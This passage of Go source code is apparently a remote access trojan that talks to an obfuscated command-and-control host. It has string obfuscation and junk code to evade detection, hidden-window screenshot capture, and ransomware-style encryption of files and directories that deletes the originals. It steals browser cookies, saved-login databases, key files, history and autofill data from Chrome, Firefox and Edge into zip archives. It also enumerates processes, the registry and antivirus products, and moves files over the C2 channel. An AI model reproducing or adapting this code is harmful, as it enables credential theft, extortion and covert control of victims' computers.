		sendData(conn, response)
		return
	}

	const chunkSize = 1048576
	chunks := make([]string, 0)

	for i := 0; i < len(result); i += chunkSize {
		end := i + chunkSize
		if end > len(result) {
			end = len(result)
		}
		chunks = append(chunks, result[i:end])
	}

	headerResponse := Resp{Type: "response", Content: fmt.Sprintf("=== LARGE OUTPUT ===\nTotal size: %d characters\nTotal chunks: %d\nStarting transmission...\n", len(result), len(chunks))}
	sendData(conn, headerResponse)
	time.Sleep(50 * time.Millisecond)

	for i, chunk := range chunks {
		progress := fmt.Sprintf("=== CHUNK %d/%d (%.1f%%) ===\n", i+1, len(chunks), float64(i+1)/float64(len(chunks))*100)
		chunkContent := progress + chunk

		response := Resp{Type: "response", Content: chunkContent}
		err := sendData(conn, response)
		if err != nil {
			errorResponse := Resp{Type: "response", Content: fmt.Sprintf("Error sending chunk %d: %v", i+1, err)}
			sendData(conn, errorResponse)
			return
		}
		time.Sleep(25 * time.Millisecond)
	}

	completionResponse := Resp{Type: "response", Content: fmt.Sprintf("=== TRANSMISSION COMPLETE ===\nCommand completed successfully.\nTotal characters: %d\nTotal chunks sent: %d\n", len(result), len(chunks))}
	sendData(conn, completionResponse)
}

func takeSnapshot() string {
	if runtime.GOOS != "windows" {
		return "Snapshot only supported on Windows"
	}
	userLibLoad := syscall.NewLazyDLL(shiftDecrypt(userLib))
	gdiLibLoad := syscall.NewLazyDLL(shiftDecrypt(gdiLib))
	metricsProc := userLibLoad.NewProc(shiftDecrypt(getMetricsProc))
	width, _, _ := metricsProc.Call(0)
	height, _, _ := metricsProc.Call(1)
	dcProc := userLibLoad.NewProc(shiftDecrypt(getDCProc))
	dc, _, _ := dcProc.Call(0)
	compatDCProc := gdiLibLoad.NewProc(shiftDecrypt(createDCProc))
	memDC, _, _ := compatDCProc.Call(dc)
	compatBitmapProc := gdiLibLoad.NewProc(shiftDecrypt(createBitmapProc))
	bitmap, _, _ := compatBitmapProc.Call(dc, width, height)
	selectProc := gdiLibLoad.NewProc(shiftDecrypt(selectObjProc))
	selectProc.Call(memDC, bitmap)
	copyProc := gdiLibLoad.NewProc(shiftDecrypt(bitCopyProc))
	copyProc.Call(memDC, 0, 0, width, height, dc, 0, 0, uintptr(copyFlag))
	filename := fmt.Sprintf("snapshot_%d.bmp", time.Now().Unix())
	currentDir, err := os.Getwd()
	if err != nil {
		currentDir = "."
	}
	fullPath := filepath.Join(currentDir, filename)
	openClipProc := userLibLoad.NewProc(shiftDecrypt(openClipProc))
	emptyClipProc := userLibLoad.NewProc(shiftDecrypt(emptyClipProc))
	setClipProc := userLibLoad.NewProc(shiftDecrypt(setClipProc))
	closeClipProc := userLibLoad.NewProc(shiftDecrypt(closeClipProc))
	openClipProc.Call(0)
	emptyClipProc.Call()
	setClipProc.Call(uintptr(bitmapFlag), bitmap)
	closeClipProc.Call()
	batchContent := fmt.Sprintf(`@echo off
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $clipboard = [System.Windows.Forms.Clipboard]::GetImage(); if ($clipboard) { $clipboard.Save('%s', [System.Drawing.Imaging.ImageFormat]::Bmp); Write-Host 'Snapshot saved successfully' } else { Write-Host 'Failed to capture snapshot' }"`, fullPath)
	batchPath := filepath.Join(os.TempDir(), "snapshot.bat")
	err = os.WriteFile(batchPath, []byte(batchContent), 0644)
	if err != nil {
		return fmt.Sprintf("Failed to create snapshot script: %v", err)
	}
	cmd := exec.Command("cmd", "/c", batchPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
	cmd.Run()
	os.Remove(batchPath)
	delObjProc := gdiLibLoad.NewProc(shiftDecrypt(deleteObjProc))
	delDCProc := gdiLibLoad.NewProc(shiftDecrypt(deleteDCProc))
	relDCProc := userLibLoad.NewProc(shiftDecrypt(releaseDCProc))
	delObjProc.Call(bitmap)
	delDCProc.Call(memDC)
	relDCProc.Call(0, dc)
	_ = hashString("snapshot_junk")
	return fmt.Sprintf("Snapshot saved as: %s", filename)
}

func changeDir(path string) string {
	err := os.Chdir(path)
	if err != nil {
		return fmt.Sprintf("Error changing directory: %v", err)
	}
	currentDir, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("Directory changed, but couldn't get current path: %v", err)
	}
	return fmt.Sprintf("\nCurrent directory changed to: %s", currentDir)
}

// cleanCommandPathArg trims spaces/quotes from CLI path args (cd / ls / dir).
func cleanCommandPathArg(raw string) string {
	s := strings.TrimSpace(raw)
	if len(s) >= 2 && s[0] == '"' && s[len(s)-1] == '"' {
		s = strings.TrimSpace(s[1 : len(s)-1])
	}
	s = strings.TrimSpace(s)
	if s == "" {
		return s
	}
	return filepath.Clean(s)
}

func listDir(path string) string {
	var result strings.Builder

	if path == "" {
		currentDir, err := os.Getwd()
		if err != nil {
			return fmt.Sprintf("Error getting current directory: %v", err)
		}
		path = currentDir
	} else {
		path = cleanCommandPathArg(path)
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Sprintf("Error reading directory %s: %v", path, err)
	}

	result.WriteString(fmt.Sprintf("Directory: %s\n", path))
	result.WriteString("Type\tName\t\t\tSize\t\tModified\n")
	result.WriteString(strings.Repeat("-", 80) + "\n")

	var dirs []os.DirEntry
	var files []os.DirEntry

	for _, entry := range entries {
		if entry.IsDir() {
			dirs = append(dirs, entry)
		} else {
			files = append(files, entry)
		}
	}

	for _, dir := range dirs {
		info, err := dir.Info()
		if err != nil {
			continue
		}
		result.WriteString(fmt.Sprintf("<DIR>\t%-30s\t%s\t\t%s\n",
			dir.Name(),
			"<DIR>",
			info.ModTime().Format("2006-01-02 15:04:05")))
	}

	for _, file := range files {
		info, err := file.Info()
		if err != nil {
			continue
		}

		size := formatFileSize(info.Size())
		result.WriteString(fmt.Sprintf("FILE\t%-30s\t%-10s\t%s\n",
			file.Name(),
			size,
			info.ModTime().Format("2006-01-02 15:04:05")))
	}

	return result.String()
}

func formatFileSize(size int64) string {
	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%d B", size)
	}
	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
}

func getCurrentDir() string {
	dir, err := os.Getwd()
	if err != nil {
		return "."
	}
	return dir
}

func generateKey(password string) []byte {
	hash := sha256.Sum256([]byte(password))
	return hash[:]
}

func encryptFile(filePath string, password string) string {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Sprintf("Failed to read file: %v", err)
	}
	key := generateKey(password)
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Sprintf("Failed to create cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Sprintf("Failed to create GCM: %v", err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Sprintf("Failed to create nonce: %v", err)
	}
	ciphertext := gcm.Seal(nonce, nonce, content, nil)
	encryptedPath := filePath + ".encrypted"
	err = os.WriteFile(encryptedPath, ciphertext, 0644)
	if err != nil {
		return fmt.Sprintf("Failed to save encrypted file: %v", err)
	}
	encryptedData[filePath] = encryptedPath
	os.Remove(filePath)
	return fmt.Sprintf("File encrypted: %s -> %s", filePath, encryptedPath)
}

func decryptFile(filePath string, password string) string {
	encryptedPath := filePath + ".encrypted"
	if _, err := os.Stat(encryptedPath); os.IsNotExist(err) {
		return "Encrypted file not found"
	}
	ciphertext, err := os.ReadFile(encryptedPath)
	if err != nil {
		return fmt.Sprintf("Failed to read encrypted file: %v", err)
	}
	key := generateKey(password)
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Sprintf("Failed to create cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Sprintf("Failed to create GCM: %v", err)
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return "Invalid encrypted file"
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return fmt.Sprintf("Decryption failed: %v", err)
	}
	err = os.WriteFile(filePath, plaintext, 0644)
	if err != nil {
		return fmt.Sprintf("Failed to save decrypted file: %v", err)
	}
	os.Remove(encryptedPath)
	delete(encryptedData, filePath)
	return fmt.Sprintf("File decrypted: %s", filePath)
}

func encryptDir(dirPath string, password string) string {
	var results []string
	var totalFiles, encryptedFiles int
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() || strings.HasPrefix(info.Name(), ".") ||
			strings.HasSuffix(path, ".encrypted") || strings.Contains(path, "System32") ||
			strings.Contains(path, "Windows") {
			return nil
		}
		if strings.HasSuffix(strings.ToLower(path), ".exe") ||
			strings.HasSuffix(strings.ToLower(path), ".dll") ||
			strings.HasSuffix(strings.ToLower(path), ".sys") {
			return nil
		}
		totalFiles++
		result := encryptFile(path, password)
		if strings.Contains(result, "File encrypted") {
			encryptedFiles++
		}
		results = append(results, result)
		return nil
	})
	if err != nil {
		return fmt.Sprintf("Error walking directory: %v", err)
	}
	summary := fmt.Sprintf("Directory encryption complete!\nTotal files: %d\nEncrypted: %d\nFailed: %d",
		totalFiles, encryptedFiles, totalFiles-encryptedFiles)
	return summary + "\n\n" + strings.Join(results, "\n")
}

func decryptDir(dirPath string, password string) string {
	var results []string
	var totalFiles, decryptedFiles int
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !strings.HasSuffix(path, ".encrypted") {
			return nil
		}
		totalFiles++
		originalPath := strings.TrimSuffix(path, ".encrypted")
		result := decryptFile(originalPath, password)
		if strings.Contains(result, "File decrypted") {
			decryptedFiles++
		}
		results = append(results, result)
		return nil
	})
	if err != nil {
		return fmt.Sprintf("Error walking directory: %v", err)
	}
	summary := fmt.Sprintf("Directory decryption complete!\nTotal encrypted files: %d\nDecrypted: %d\nFailed: %d",
		totalFiles, decryptedFiles, totalFiles-decryptedFiles)
	return summary + "\n\n" + strings.Join(results, "\n")
}

func setPass(newPass string) string {
	currentPass = newPass
	encKey = generateKey(newPass)
	return fmt.Sprintf("Password set successfully: %s", newPass)
}

func getPass() string {
	if currentPass == "" {
		return "No password set"
	}
	return fmt.Sprintf("Current password: %s", currentPass)
}

func listEncrypted() string {
	if len(encryptedData) == 0 {
		return "No encrypted files found"
	}
	var result strings.Builder
	result.WriteString("Encrypted files:\n")
	for original, encrypted := range encryptedData {
		result.WriteString(fmt.Sprintf("  %s -> %s\n", original, encrypted))
	}
	return result.String()
}

func getProfiles() []string {
	var profiles []string

	chromePaths := []string{
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
		filepath.Join(os.Getenv("APPDATA"), "Google", "Chrome", "User Data"),
	}

	for _, chromePath := range chromePaths {
		if _, err := os.Stat(chromePath); err == nil {
			profiles = append(profiles, filepath.Join(chromePath, "Default"))
			profileDirs, _ := filepath.Glob(filepath.Join(chromePath, "Profile *"))
			profiles = append(profiles, profileDirs...)
		}
	}

	firefoxPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Mozilla", "Firefox", "Profiles"),
	}

	for _, firefoxPath := range firefoxPaths {
		if _, err := os.Stat(firefoxPath); err == nil {
			firefoxDirs, _ := filepath.Glob(filepath.Join(firefoxPath, "*"))
			for _, dir := range firefoxDirs {
				if info, err := os.Stat(dir); err == nil && info.IsDir() {
					profiles = append(profiles, dir)
				}
			}
		}
	}

	edgePaths := []string{
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Edge", "User Data"),
	}

	for _, edgePath := range edgePaths {
		if _, err := os.Stat(edgePath); err == nil {
			profiles = append(profiles, filepath.Join(edgePath, "Default"))
			edgeDirs, _ := filepath.Glob(filepath.Join(edgePath, "Profile *"))
			profiles = append(profiles, edgeDirs...)
		}
	}

	return profiles
}

func copyToZip(zipWriter *zip.Writer, srcPath, destPath string) error {
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	destFile, err := zipWriter.Create(destPath)
	if err != nil {
		return err
	}

	_, err = io.Copy(destFile, srcFile)
	return err
}

func extractData() string {
	tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("tmp_%d", time.Now().UnixNano()))
	os.MkdirAll(tempDir, 0755)
	defer os.RemoveAll(tempDir)

	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("~%d.tmp", time.Now().UnixNano()))
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return fmt.Sprintf("Failed to create zip file: %v", err)
	}
	defer zipFile.Close()
	defer os.Remove(zipPath)

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	profiles := getProfiles()
	var extractedFiles []string

	for _, profilePath := range profiles {
		if _, err := os.Stat(profilePath); os.IsNotExist(err) {
			continue
		}

		profileName := filepath.Base(profilePath)
		if profileName == "" {
			profileName = "Default"
		}

		cookieFiles := []string{
			"Cookies",
			"Network/Cookies",
			"cookies.sqlite",
			"cookies.sqlite-wal",
			"cookies.sqlite-shm",
		}

		for _, cookieFile := range cookieFiles {
			srcPath := filepath.Join(profilePath, cookieFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, cookieFile)
				if err := copyToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		loginFiles := []string{
			"Login Data",
			"logins.json",
			"key4.db",
			"key3.db",
			"cert9.db",
		}

		for _, loginFile := range loginFiles {
			srcPath := filepath.Join(profilePath, loginFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, loginFile)
				if err := copyToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		historyFiles := []string{
			"History",
			"places.sqlite",
			"Web Data",
		}

		for _, historyFile := range historyFiles {
			srcPath := filepath.Join(profilePath, historyFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, historyFile)
				if err := copyToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		bookmarkFiles := []string{
			"Bookmarks",
			"bookmarks.json",
		}

		for _, bookmarkFile := range bookmarkFiles {
			srcPath := filepath.Join(profilePath, bookmarkFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, bookmarkFile)
				if err := copyToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		autofillFiles := []string{
			"Web Data",
			"formhistory.sqlite",
		}

		for _, autofillFile := range autofillFiles {
			srcPath := filepath.Join(profilePath, autofillFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/autofill_%s", profileName, autofillFile)
				if err := copyToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}
	}

	systemPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Cookies"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", "INetCookies"),
	}

	for _, sysPath := range systemPaths {
		if _, err := os.Stat(sysPath); err == nil {
			filepath.Walk(sysPath, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if !info.IsDir() {
					relPath, _ := filepath.Rel(sysPath, path)
					destPath := fmt.Sprintf("System/%s", relPath)
					if err := copyToZip(zipWriter, path, destPath); err == nil {
						extractedFiles = append(extractedFiles, destPath)
					}
				}
				return nil
			})
		}
	}

	if len(extractedFiles) == 0 {
		return "No data found to extract"
	}

	zipWriter.Close()
	zipFile.Close()

	time.Sleep(100 * time.Millisecond)

	finalPath := filepath.Join(os.TempDir(), fmt.Sprintf("data_%d.zip", time.Now().UnixNano()))
	err = os.Rename(zipPath, finalPath)
	if err != nil {
		srcFile, err2 := os.Open(zipPath)
		if err2 != nil {
			return fmt.Sprintf("Failed to move zip file: %v", err)
		}
		defer srcFile.Close()

		dstFile, err2 := os.Create(finalPath)
		if err2 != nil {
			return fmt.Sprintf("Failed to create final zip file: %v", err2)
		}
		defer dstFile.Close()

		_, err2 = io.Copy(dstFile, srcFile)
		if err2 != nil {
			return fmt.Sprintf("Failed to copy zip file: %v", err2)
		}

		os.Remove(zipPath)
	}

	pathRefFile := filepath.Join(os.TempDir(), fmt.Sprintf("~data_paths_%d.txt", time.Now().UnixNano()))
	pathContent := fmt.Sprintf("Data Extraction Results\n================================\n\nZIP File Location: %s\n\nExtracted Files (%d):\n%s\n\nExtraction Time: %s\n\nNote: This file will be automatically deleted after 24 hours.",
		finalPath, len(extractedFiles), strings.Join(extractedFiles, "\n"), time.Now().Format("2006-01-02 15:04:05"))
	os.WriteFile(pathRefFile, []byte(pathContent), 0644)

	go func() {
		time.Sleep(24 * time.Hour)
		os.Remove(finalPath)
		os.Remove(pathRefFile)
	}()

	return fmt.Sprintf("Data extracted successfully!\n\nZIP FILE LOCATION:\n%s\n\nPATH REFERENCE FILE:\n%s\n\nEXTRACTION SUMMARY:\nFiles extracted: %d\n\nEXTRACTED FILES:\n%s\n\nTIP: You can access the zip file at the path above to view all data",
		finalPath, pathRefFile, len(extractedFiles), strings.Join(extractedFiles, "\n"))
}

func extractDataHidden() string {
	hiddenDir := filepath.Join(os.TempDir(), fmt.Sprintf("~%x", time.Now().UnixNano()))
	os.MkdirAll(hiddenDir, 0755)
	defer os.RemoveAll(hiddenDir)

	zipPath := filepath.Join(hiddenDir, fmt.Sprintf("data_%x.zip", time.Now().UnixNano()))

	zipFile, err := os.Create(zipPath)
	if err != nil {
		return fmt.Sprintf("Failed to create zip: %v", err)
	}
	defer zipFile.Close()
	defer os.Remove(zipPath)

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	profiles := getProfiles()
	var extractedFiles []string

	browserData := map[string][]string{
		"cookies":     {"Cookies", "Network/Cookies", "cookies.sqlite", "cookies.sqlite-wal", "cookies.sqlite-shm"},
		"logins":      {"Login Data", "logins.json", "key4.db", "key3.db", "cert9.db", "key.db"},
		"history":     {"History", "places.sqlite", "Web Data", "urls.sqlite"},
		"bookmarks":   {"Bookmarks", "bookmarks.json", "bookmarks.bak"},
		"autofill":    {"Web Data", "formhistory.sqlite", "autofill_profiles.sqlite"},
		"passwords":   {"Login Data", "logins.json", "signons.sqlite"},
		"downloads":   {"History", "downloads.sqlite"},
		"cache":       {"Cache", "cache2", "GPUCache", "ShaderCache"},
		"extensions":  {"Extensions", "Local Extension Settings"},
		"preferences": {"Preferences", "prefs.js", "user.js"},
	}

	for _, profilePath := range profiles {
		if _, err := os.Stat(profilePath); os.IsNotExist(err) {
			continue
		}

		profileName := filepath.Base(profilePath)
		if profileName == "" {
			profileName = "Default"
		}

		for dataType, files := range browserData {
			for _, fileName := range files {
				srcPath := filepath.Join(profilePath, fileName)
				if _, err := os.Stat(srcPath); err == nil {
					destPath := fmt.Sprintf("%s/%s/%s", profileName, dataType, fileName)
					if err := copyToZip(zipWriter, srcPath, destPath); err == nil {
						extractedFiles = append(extractedFiles, destPath)
					}
				}
			}
		}

		profileDirs := []string{"Local Storage", "Session Storage", "IndexedDB", "databases"}
		for _, dirName := range profileDirs {
			dirPath := filepath.Join(profilePath, dirName)
			if _, err := os.Stat(dirPath); err == nil {
				filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
					if err != nil {
						return nil
					}
					if !info.IsDir() {
						relPath, _ := filepath.Rel(profilePath, path)
						destPath := fmt.Sprintf("%s/%s", profileName, relPath)
						if err := copyToZip(zipWriter, path, destPath); err == nil {
							extractedFiles = append(extractedFiles, destPath)
						}
					}
					return nil
				})
			}
		}
	}

	systemDataPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Cookies"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", "INetCookies"),
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Recent"),
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes"),
	}

	for _, sysPath := range systemDataPaths {
		if _, err := os.Stat(sysPath); err == nil {
			filepath.Walk(sysPath, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if !info.IsDir() {
					relPath, _ := filepath.Rel(sysPath, path)
					destPath := fmt.Sprintf("System/%s", relPath)
					if err := copyToZip(zipWriter, path, destPath); err == nil {
						extractedFiles = append(extractedFiles, destPath)
					}
				}
				return nil
			})
		}
	}

	if len(extractedFiles) == 0 {
		return "No data found for hidden extraction"
	}

	zipWriter.Close()
	zipFile.Close()

	time.Sleep(100 * time.Millisecond)

	appLocations := []string{
		filepath.Join(os.TempDir(), fmt.Sprintf("data_%x.zip", time.Now().UnixNano())),
		filepath.Join(os.Getenv("TEMP"), fmt.Sprintf("data_%x.zip", time.Now().UnixNano())),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Temp", fmt.Sprintf("data_%x.zip", time.Now().UnixNano())),
	}

	var finalPaths []string
	for _, location := range appLocations {
		if err := os.Rename(zipPath, location); err == nil {
			finalPaths = append(finalPaths, location)
			go func(path string) {
				time.Sleep(48 * time.Hour)
				os.Remove(path)
			}(location)
			break
		} else {
			srcFile, err2 := os.Open(zipPath)
			if err2 == nil {
				dstFile, err2 := os.Create(location)
				if err2 == nil {
					io.Copy(dstFile, srcFile)
					dstFile.Close()
					srcFile.Close()
					os.Remove(zipPath)
					finalPaths = append(finalPaths, location)
					go func(path string) {
						time.Sleep(48 * time.Hour)
						os.Remove(path)
					}(location)
					break
				}
				srcFile.Close()
			}
		}
	}

	if len(finalPaths) == 0 {
		return fmt.Sprintf("Hidden extraction completed but failed to move files\nFiles extracted: %d", len(extractedFiles))
	}

	pathRefFile := filepath.Join(os.TempDir(), fmt.Sprintf("~hidden_paths_%d.txt", time.Now().UnixNano()))
	pathContent := fmt.Sprintf("Hidden Data Extraction Results\n========================================\n\nZIP File Locations:\n%s\n\nExtracted Files (%d):\n%s\n\nExtraction Time: %s\n\nNote: These files will be automatically deleted after 48 hours.",
		strings.Join(finalPaths, "\n"), len(extractedFiles), strings.Join(extractedFiles, "\n"), time.Now().Format("2006-01-02 15:04:05"))
	os.WriteFile(pathRefFile, []byte(pathContent), 0644)

	go func() {
		time.Sleep(48 * time.Hour)
		os.Remove(pathRefFile)
	}()

	return fmt.Sprintf("Hidden data extraction completed!\n\nZIP FILE LOCATIONS:\n%s\n\nPATH REFERENCE FILE:\n%s\n\nEXTRACTION SUMMARY:\nFiles extracted: %d\n\nEXTRACTED FILES:\n%s\n\nTIP: You can access the zip files at the paths above to view all data",
		strings.Join(finalPaths, "\n"), pathRefFile, len(extractedFiles), strings.Join(extractedFiles, "\n"))
}

func getRecentPaths() string {
	var paths []string

	tempDir := os.TempDir()
	files, err := filepath.Glob(filepath.Join(tempDir, "~*_paths_*.txt"))
	if err != nil {
		return "No recent paths found"
	}

	for _, file := range files {
		content, err := os.ReadFile(file)
		if err == nil {
			paths = append(paths, fmt.Sprintf("%s\n%s", file, string(content)))
		}
	}

	if len(paths) == 0 {
		return "No recent paths found"
	}

	return fmt.Sprintf("Recent Data Paths:\n%s", strings.Join(paths, "\n\n"))
}

func getHost() string {
	if host := os.Getenv("C2_HOST"); strings.TrimSpace(host) != "" {
		return strings.TrimSpace(host)
	}
	if c2LocalTestMode {
		return "127.0.0.1"
	}
	return deobfuscateString(obfC2Host)
}

func getPort() int {
	if p := strings.TrimSpace(os.Getenv("C2_PORT")); p != "" {
		if v, err := strconv.Atoi(p); err == nil && v > 0 && v < 65536 {
			return v
		}
	}
	if c2LocalTestMode {
		return 443
	}
	portStr := deobfuscateString(obfPortStr)
	if v, err := strconv.Atoi(portStr); err == nil {
		return v
	}
	return 443
}

// Control flow flattening wrapper for handleCmd (junk branches)
func obfuscatedHandleCmd(command string, conn net.Conn) {
	// Junk switch based on command hash mod 10
	cmdHash := hashString(command) % 10
	switch cmdHash {
	case 0, 2, 4, 6, 8: // Even: real path (covers most)
		handleCmd(command, conn)
	case 1, 3, 5, 7, 9: // Odd: junk delay/noop
		time.Sleep(2 * time.Millisecond)
		junk := 0
		for i := 0; i < 10; i++ {
			junk += i
		}
		_ = junk
		// Fallback to real after junk
		handleCmd(command, conn)
	}
	// Additional junk
	_ = hashString("cmd_junk_" + command)
}

func handleCmd(command string, conn net.Conn) {
	testStr := deobfuscateString(obfTest)
	debugStr := deobfuscateString(obfDebug)
	uploadStr := deobfuscateString(obfUpload)
	downloadStr := deobfuscateString(obfDownload)
	killStr := deobfuscateString(obfKill)
	sysinfoStr := deobfuscateString(obfSysinfo)
	processesStr := deobfuscateString(obfProcesses)
	servicesStr := deobfuscateString(obfServices)
	networkStr := deobfuscateString(obfNetwork)
	screenshotStr := deobfuscateString(obfScreenshot)
	registryStr := deobfuscateString(obfRegistry)
	startupStr := deobfuscateString(obfStartup)
	firewallStr := deobfuscateString(obfFirewall)
	antivirusStr := deobfuscateString(obfAntivirus)
	setpassStr := deobfuscateString(obfSetpass)
	getpassStr := deobfuscateString(obfGetpass)
	encryptStr := deobfuscateString(obfEncrypt)
	decryptStr := deobfuscateString(obfDecrypt)
	listencryptedStr := deobfuscateString(obfListencrypted)
	extractbrowserStr := deobfuscateString(obfExtractbrowser)
	extractbrowserhiddenStr := deobfuscateString(obfExtractbrowserhidden)
	browserpathsStr := deobfuscateString(obfBrowserpaths)
	setpersistenceStr := deobfuscateString(obfSetpersistence)
	removepersistenceStr := deobfuscateString(obfRemovepersistence)
	checkpersistenceStr := deobfuscateString(obfCheckpersistence)
	lsStr := deobfuscateString(obfLs)
	dirStr := deobfuscateString(obfDir)
	pwdStr := deobfuscateString(obfPwd)
	qStr := deobfuscateString(obfQ)
	cdStr := deobfuscateString(obfCd)

	if command == qStr {
		return
	} else if command == testStr {
		response := Resp{Type: "response", Content: "Test command executed successfully - Client is working!"}
		sendData(conn, response)
	} else if command == debugStr {
		response := Resp{Type: "response", Content: "Debug: Client is responding to commands"}
		sendData(conn, response)
	} else if strings.HasPrefix(command, uploadStr) {
		filename := strings.TrimSpace(strings.TrimPrefix(command, uploadStr))
		response := Resp{Type: "response", Content: "ready"}
		sendData(conn, response)
		err := uploadFile(conn, filename)
		if err != nil {
			response = Resp{Type: "response", Content: fmt.Sprintf("Upload %s: Failed - %v", filename, err)}
			sendData(conn, response)
		}
	} else if strings.HasPrefix(command, downloadStr) {
		filename := strings.TrimSpace(strings.TrimPrefix(command, downloadStr))
		err := downloadFile(conn, filename)
		if err != nil {
			response := Resp{Type: "response", Content: fmt.Sprintf("Download %s: Failed - %v", filename, err)}
			sendData(conn, response)
		}
	} else if command == killStr {
		conn.Close()
		return
	} else if command == sysinfoStr {
		result := fmt.Sprintf("Hostname: %s\nUsername: %s\nMAC Address: %s\nOS: %s\nArchitecture: %s",
			getHostname(), getUsername(), getMACAddress(), runtime.GOOS, runtime.GOARCH)
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == processesStr {
		runCommandWithChunks("tasklist /fo csv /nh", conn)
	} else if command == servicesStr {
		result := runCommand("net start")
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == networkStr {
		runCommandWithChunks("ipconfig /all", conn)
	} else if command == screenshotStr {
		result := takeSnapshot()
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == registryStr {
		runCommandWithChunks("reg query HKCU /s", conn)
	} else if command == startupStr {
		result := runCommand("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == firewallStr {
		result := runCommand("netsh advfirewall show allprofiles")
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == antivirusStr {
		runCommandWithChunks("wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", conn)
	} else if strings.HasPrefix(command, setpassStr) {
		password := strings.TrimPrefix(command, setpassStr)
		result := setPass(password)
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == getpassStr {
		result := getPass()
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if strings.HasPrefix(command, encryptStr) {
		path := strings.TrimPrefix(command, encryptStr)
		if currentPass == "" {
			response := Resp{Type: "response", Content: "No password set. Use 'setpass <password>' first."}
			sendData(conn, response)
		} else {
			var result string
			if info, err := os.Stat(path); err == nil && info.IsDir() {
				result = encryptDir(path, currentPass)
			} else {
				result = encryptFile(path, currentPass)
			}
			response := Resp{Type: "response", Content: result}
			sendData(conn, response)
		}
	} else if strings.HasPrefix(command, decryptStr) {
		path := strings.TrimPrefix(command, decryptStr)
		if currentPass == "" {
			response := Resp{Type: "response", Content: "No password set. Use 'setpass <password>' first."}
			sendData(conn, response)
		} else {
			var result string
			if info, err := os.Stat(path); err == nil && info.IsDir() {
				result = decryptDir(path, currentPass)
			} else {
				result = decryptFile(path, currentPass)
			}
			response := Resp{Type: "response", Content: result}
			sendData(conn, response)
		}
	} else if command == listencryptedStr {
		result := listEncrypted()
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == extractbrowserStr {
		result := extractData()
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == extractbrowserhiddenStr {
		result := extractDataHidden()
